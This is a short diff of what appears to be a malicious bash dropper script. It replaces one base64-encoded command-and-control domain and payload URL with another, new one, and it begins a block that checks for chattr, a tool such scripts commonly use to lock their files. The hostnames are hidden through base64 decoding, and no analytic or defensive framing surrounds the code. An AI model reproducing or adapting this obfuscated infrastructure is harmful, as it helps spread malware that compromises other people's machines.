@@ -1,11 +1,11 @@
 #!/bin/bash
 #variables
 
-# kiss.a-dog.top
-domain=$(echo a2lzcy5hLWRvZy50b3AK|base64 -d)
+# solscan.live
+domain=$(echo c29sc2Nhbi5saXZlCg==|base64 -d)
 
-# http://kiss.a-dog.top/b2f628
-mainurl=$(echo aHR0cDovL2tpc3MuYS1kb2cudG9wL2IyZjYyOAo=|base64 -d)
+# http://solscan.live/b2f628
+mainurl=$(echo aHR0cDovL3NvbHNjYW4ubGl2ZS9iMmY2MjgK|base64 -d)
 
 #mv command
 if [ -x /bin/chattr ];then
